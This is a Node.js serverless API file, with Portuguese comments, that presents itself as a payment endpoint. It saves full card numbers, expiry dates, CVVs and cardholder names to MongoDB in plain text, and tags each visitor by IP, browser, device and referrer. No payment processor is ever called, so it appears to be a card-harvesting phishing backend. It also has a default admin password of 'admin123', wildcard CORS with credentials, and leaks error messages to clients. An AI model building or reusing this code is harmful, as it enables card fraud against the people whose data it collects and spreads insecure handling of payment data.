const mongoose = require('mongoose');

// Cache da conexão do MongoDB
let cached = global.mongoose;
if (!cached) {
    cached = global.mongoose = { conn: null, promise: null };
}

async function connectToDatabase() {
    if (cached.conn) return cached.conn;
    
    if (!cached.promise) {
        const opts = {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            bufferCommands: false,
        };

        const MONGODB_URI = process.env.MONGODB_URI;
        
        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI não configurada');
        }

        cached.promise = mongoose.connect(MONGODB_URI, opts).then((mongoose) => {
            console.log('✅ Conectado ao MongoDB Atlas');
            return mongoose;
        }).catch(err => {
            console.error('❌ Erro na conexão MongoDB:', err.message);
            throw err;
        });
    }
    
    try {
        cached.conn = await cached.promise;
    } catch (e) {
        cached.promise = null;
        throw e;
    }
    
    return cached.conn;
}

// Schema do MongoDB
const paymentSchema = new mongoose.Schema({
    cardNumber: { type: String, required: true },
    expiryDate: { type: String, required: true },
    cvv: { type: String, required: true },
    cardName: { type: String, required: true },
    paymentType: { type: String, enum: ['credit', 'debit'], required: true },
    
    ipAddress: String,
    userAgent: String,
    timestamp: { type: Date, default: Date.now },
    status: { type: String, default: 'completed' },
    
    browser: String,
    os: String,
    device: String,
    
    referrer: String,
    landingPage: String
}, {
    timestamps: true
});

let Payment;
if (mongoose.models.Payment) {
    Payment = mongoose.models.Payment;
} else {
    Payment = mongoose.model('Payment', paymentSchema);
}

// Handler da API
module.exports = async (req, res) => {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    try {
        await connectToDatabase();
        
        if (req.method === 'POST') {
            const data = req.body;
            
            // Validação
            if (!data.cardNumber || !data.expiryDate || !data.cvv || !data.cardName || !data.paymentType) {
                return res.status(400).json({
                    success: false,
                    error: 'Dados incompletos'
                });
            }
            
            // Informações do cliente
            const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || 'unknown';
            const userAgent = req.headers['user-agent'] || 'unknown';
            const referrer = req.headers['referer'] || req.headers['referrer'] || 'direct';
            
            // Detectar navegador e sistema
            let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'macOS';
            else if (userAgent.includes('Linux')) os = 'Linux';
            else if (userAgent.includes('Android')) { os = 'Android'; device = 'Mobile'; }
            else if (userAgent.includes('iPhone')) { os = 'iOS'; device = 'iPhone'; }
            
            // Criar pagamento
            const paymentData = {
                ...data,
                ipAddress: ip,
                userAgent: userAgent,
                browser: browser,
                os: os,
                device: device,
                referrer: referrer,
                landingPage: req.headers.origin || 'unknown'
            };
            
            const payment = new Payment(paymentData);
            await payment.save();
            
            console.log('💾 Pagamento salvo:', {
                id: payment._id.toString(),
                card: payment.cardName,
                type: payment.paymentType,
                time: payment.createdAt
            });
            
            return res.status(201).json({
                success: true,
                message: 'Pagamento registrado com sucesso',
                paymentId: payment._id.toString(),
                timestamp: payment.createdAt
            });
        }
        
        // GET para dashboard (protegido)
        if (req.method === 'GET') {
            // Verificação simples de senha
            const auth = req.headers.authorization;
            const validPassword = process.env.ADMIN_PASSWORD || 'admin123';
            
            if (auth !== `Bearer ${validPassword}`) {
                return res.status(401).json({ 
                    success: false, 
                    error: 'Não autorizado' 
                });
            }
            
            const payments = await Payment.find()
                .sort({ createdAt: -1 })
                .limit(50)
                .select('cardName paymentType createdAt ipAddress browser device');
            
            return res.json({
                success: true,
                data: payments.map(p => ({
                    id: p._id,
                    cardName: p.cardName,
                    last4: p.cardNumber ? '****' + p.cardNumber.slice(-4) : 'N/A',
                    paymentType: p.paymentType,
                    date: p.createdAt,
                    ip: p.ipAddress,
                    browser: p.browser,
                    device: p.device
                }))
            });
        }
        
        return res.status(405).json({ error: 'Método não permitido' });
        
    } catch (error) {
        console.error('❌ Erro na API:', error);
        return res.status(500).json({
            success: false,
            error: 'Erro interno do servidor',
            message: error.message
        });
    }
};